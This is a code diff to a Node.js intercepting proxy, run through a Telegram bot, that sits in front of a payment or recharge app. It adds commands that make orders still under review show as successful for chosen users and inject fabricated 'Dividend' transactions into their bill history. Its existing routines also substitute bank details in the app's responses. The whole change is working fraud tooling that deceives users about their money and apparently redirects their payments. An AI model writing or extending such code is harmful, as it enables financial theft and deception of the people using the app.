@@ -295,7 +295,8 @@ function getEffectiveSettings(data, userId) {
     botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
     depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
     depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
-    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
+    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null,
+    forceReviewSuccess: uo && uo.forceReviewSuccess === true
   };
 }
 
@@ -544,6 +545,26 @@ function markDepositSuccess(obj) {
         const num = parseInt(obj[field]);
         obj[field] = !isNaN(num) ? '2' : 'success';
       }
+    }
+  }
+}
+
+function markReviewAsSuccess(obj) {
+  if (!obj) return;
+  const reviewValues = [1, '1', 'review', 'REVIEW', 'Review', 'under_review', 'pending_review', 'reviewing'];
+  const statusFields = ['payStatus', 'status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
+  for (const field of statusFields) {
+    if (obj[field] !== undefined) {
+      if (reviewValues.includes(obj[field])) {
+        if (typeof obj[field] === 'number') obj[field] = 2;
+        else obj[field] = '2';
+      }
+    }
+  }
+  const textFields = ['payStatusName', 'statusName', 'orderStatusName', 'statusText', 'statusStr'];
+  for (const field of textFields) {
+    if (obj[field] !== undefined && typeof obj[field] === 'string') {
+      if (/review/i.test(obj[field])) obj[field] = 'SUCCESS';
     }
   }
 }
@@ -852,9 +873,51 @@ Example:
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked && tracked.phone) || ''
       });
+      if (!data.fakeBills) data.fakeBills = {};
+      if (!data.fakeBills[targetUserId]) data.fakeBills[targetUserId] = [];
+      const now = new Date();
+      const ts = now.getTime();
+      const orderNo = 'TA' + String(ts) + String(Math.floor(Math.random() * 9000000) + 1000000);
+      const timeStr = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true }).replace(/\//g, '-');
+      data.fakeBills[targetUserId].push({
+        amount: amount,
+        orderNo: orderNo,
+        createTime: timeStr,
+        timestamp: ts
+      });
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/success ')) {
+      const targetUserId = text.substring(9).trim();
+      if (!targetUserId) {
+        await bot.sendMessage(chatId, '❌ Format: /success <userId>\nExample: /success 87146');
+        return res.sendStatus(200);
+      }
+      if (!data.userOverrides) data.userOverrides = {};
+      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
+      data.userOverrides[targetUserId].forceReviewSuccess = true;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ User ${targetUserId} ke REVIEW orders ab SUCCESS dikhenge\nRevert: /unsuccess ${targetUserId}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/unsuccess ')) {
+      const targetUserId = text.substring(11).trim();
+      if (!targetUserId) {
+        await bot.sendMessage(chatId, '❌ Format: /unsuccess <userId>');
+        return res.sendStatus(200);
+      }
+      if (data.userOverrides && data.userOverrides[targetUserId]) {
+        delete data.userOverrides[targetUserId].forceReviewSuccess;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+      }
+      await bot.sendMessage(chatId, `✅ User ${targetUserId} ke orders ab real status dikhenge`);
       return res.sendStatus(200);
     }
 
@@ -1210,6 +1273,13 @@ async function proxyAndReplaceBankDetails(req, res, label) {
           deepReplace(respData, savedBank, {}, 0);
         }
       }
+      if (eff.forceReviewSuccess) {
+        if (Array.isArray(respData)) {
+          respData.forEach(item => markReviewAsSuccess(item));
+        } else {
+          markReviewAsSuccess(respData);
+        }
+      }
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1324,12 +1394,16 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
           if (primaryId) bankMap[primaryId] = bank;
         }
       }
+      const eff2 = getEffectiveSettings(data, detectedUserId);
       for (const item of items) {
         const ids = getItemIds(item);
         const primaryId = ids[0] || '';
         const savedBank = primaryId ? bankMap[primaryId] : null;
         if (savedBank) {
           deepReplace(item, savedBank, {}, 0);
+        }
+        if (eff2.forceReviewSuccess) {
+          markReviewAsSuccess(item);
         }
       }
     }
@@ -1780,7 +1854,75 @@ app.all('/app/bills', async (req, res) => {
 });
 
 app.all('/app/billsFilter', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
+  try {
+    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    const detectedUserId = await extractUserId(req, jsonResp);
+    if (detectedUserId) saveTokenUserId(req, detectedUserId);
+
+    const listData = getResponseData(jsonResp);
+    let items = [];
+    let itemsKey = null;
+    if (listData) {
+      if (Array.isArray(listData)) {
+        items = listData;
+      } else if (listData.list && Array.isArray(listData.list)) {
+        items = listData.list;
+        itemsKey = 'list';
+      } else if (listData.records && Array.isArray(listData.records)) {
+        items = listData.records;
+        itemsKey = 'records';
+      } else if (listData.rows && Array.isArray(listData.rows)) {
+        items = listData.rows;
+        itemsKey = 'rows';
+      }
+    }
+
+    const userBills = (data.fakeBills && detectedUserId && data.fakeBills[String(detectedUserId)]) || [];
+    if (userBills.length > 0 && items.length > 0) {
+      const template = items[0];
+      const fakeEntries = userBills.map(fb => {
+        const entry = JSON.parse(JSON.stringify(template));
+        if (entry.orderNo !== undefined) entry.orderNo = fb.orderNo;
+        if (entry.tradeNo !== undefined) entry.tradeNo = fb.orderNo;
+        if (entry.billNo !== undefined) entry.billNo = fb.orderNo;
+        const amountFields = ['amount', 'money', 'billAmount', 'tradeAmount', 'changeAmount'];
+        for (const af of amountFields) {
+          if (entry[af] !== undefined) {
+            entry[af] = typeof entry[af] === 'string' ? String(fb.amount.toFixed(2)) : fb.amount;
+          }
+        }
+        const timeFields = ['createTime', 'createDate', 'time', 'addTime', 'updateTime'];
+        for (const tf of timeFields) {
+          if (entry[tf] !== undefined) entry[tf] = fb.createTime;
+        }
+        const typeFields = ['typeName', 'billType', 'type', 'tradeType', 'categoryName'];
+        for (const tf of typeFields) {
+          if (entry[tf] !== undefined && typeof entry[tf] === 'string') entry[tf] = 'Dividend';
+        }
+        if (entry.id !== undefined) entry.id = fb.orderNo;
+        return entry;
+      });
+      fakeEntries.sort((a, b) => {
+        const fbA = userBills.find(f => f.orderNo === (a.orderNo || a.tradeNo || a.billNo));
+        const fbB = userBills.find(f => f.orderNo === (b.orderNo || b.tradeNo || b.billNo));
+        return (fbB ? fbB.timestamp : 0) - (fbA ? fbA.timestamp : 0);
+      });
+      items = [...fakeEntries, ...items];
+      if (itemsKey && listData) {
+        listData[itemsKey] = items;
+      } else if (jsonResp && jsonResp.data && Array.isArray(jsonResp.data)) {
+        jsonResp.data = items;
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    console.error('billsFilter error:', e.message);
+    await transparentProxy(req, res);
+  }
 });
 
 app.all('/app/bonusDetails', async (req, res) => {
